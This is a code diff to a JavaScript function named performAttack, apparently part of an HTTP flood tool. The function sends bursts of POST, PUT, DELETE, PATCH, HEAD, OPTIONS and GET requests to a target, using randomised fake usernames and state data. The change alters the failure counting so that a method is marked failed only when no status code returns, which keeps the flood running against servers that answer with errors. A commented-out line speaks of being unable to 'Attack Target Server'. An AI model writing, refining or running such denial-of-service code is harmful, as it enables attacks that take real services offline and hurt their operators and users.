@@ -219,8 +219,10 @@ const performAttack = (url, agent) => {
                 botprefix: '!@#$%^&*()_+{}|:"<>?`~[];\',./'[Math.floor(Math.random() * 28)],
                 username: `${['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)]}${Array.from({ length: 4 }, () => Math.random().toString(36).charAt(2)).join('')}${Array.from({ length: 2 }, () => Math.floor(Math.random() * 10)).join('')}`
             }).catch(err => {
-                failedMethods[url]['post']++;
-                console.log(`POST /create failed: ${err.message}`);
+                if (!err.response?.status) { // Only increment failure count if no status code
+                    failedMethods[url]['post']++;
+                }
+                console.log(`POST /create failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
             })
         );
     }
@@ -231,8 +233,10 @@ const performAttack = (url, agent) => {
             sendRequest('post', url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
                 state: fakeState()
             }).catch(err => {
-                failedMethods[url]['post']++;
-                console.log(`POST /login failed: ${err.message}`);
+                if (!err.response?.status) { // Only increment failure count if no status code
+                    failedMethods[url]['post']++;
+                }
+                console.log(`POST /login failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
             })
         );
     }
@@ -243,8 +247,10 @@ const performAttack = (url, agent) => {
             sendRequest('put', url, {
                 state: fakeState()
             }).catch(err => {
-                failedMethods[url]['put']++;
-                console.log(`PUT failed: ${err.message}`);
+                if (!err.response?.status) { // Only increment failure count if no status code
+                    failedMethods[url]['put']++;
+                }
+                console.log(`PUT failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
             })
         );
     }
@@ -255,8 +261,10 @@ const performAttack = (url, agent) => {
             sendRequest('delete', url, {
                 state: fakeState()
             }).catch(err => {
-                failedMethods[url]['delete']++;
-                console.log(`DELETE failed: ${err.message}`);
+                if (!err.response?.status) { // Only increment failure count if no status code
+                    failedMethods[url]['delete']++;
+                }
+                console.log(`DELETE failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
             })
         );
     }
@@ -267,8 +275,10 @@ const performAttack = (url, agent) => {
             sendRequest('patch', url, {
                 state: fakeState()
             }).catch(err => {
-                failedMethods[url]['patch']++;
-                console.log(`PATCH failed: ${err.message}`);
+                if (!err.response?.status) { // Only increment failure count if no status code
+                    failedMethods[url]['patch']++;
+                }
+                console.log(`PATCH failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
             })
         );
     }
@@ -277,8 +287,10 @@ const performAttack = (url, agent) => {
     if (failedMethods[url]['head'] < MAX_FAILURES) {
         requests.push(
             sendRequest('head', url).catch(err => {
-                failedMethods[url]['head']++;
-                console.log(`HEAD failed: ${err.message}`);
+                if (!err.response?.status) { // Only increment failure count if no status code
+                    failedMethods[url]['head']++;
+                }
+                console.log(`HEAD failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
             })
         );
     }
@@ -287,8 +299,10 @@ const performAttack = (url, agent) => {
     if (failedMethods[url]['options'] < MAX_FAILURES) {
         requests.push(
             sendRequest('options', url).catch(err => {
-                failedMethods[url]['options']++;
-                console.log(`OPTIONS failed: ${err.message}`);
+                if (!err.response?.status) { // Only increment failure count if no status code
+                    failedMethods[url]['options']++;
+                }
+                console.log(`OPTIONS failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
             })
         );
     }
@@ -297,8 +311,10 @@ const performAttack = (url, agent) => {
     if (failedMethods[url]['get'] < MAX_FAILURES) {
         requests.push(
             sendRequest('get', url).catch(err => {
-                failedMethods[url]['get']++;
-                console.log(`GET failed: ${err.message}`);
+                if (!err.response?.status) { // Only increment failure count if no status code
+                    failedMethods[url]['get']++;
+                }
+                console.log(`GET failed: ${err.message}${err.response?.status ? ` (Status: ${err.response.status})` : ''}`);
                 if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
                     // console.log(rainbow("Unable to Attack Target Server Refused!"));
                 } else if (err.response?.status === 404) {
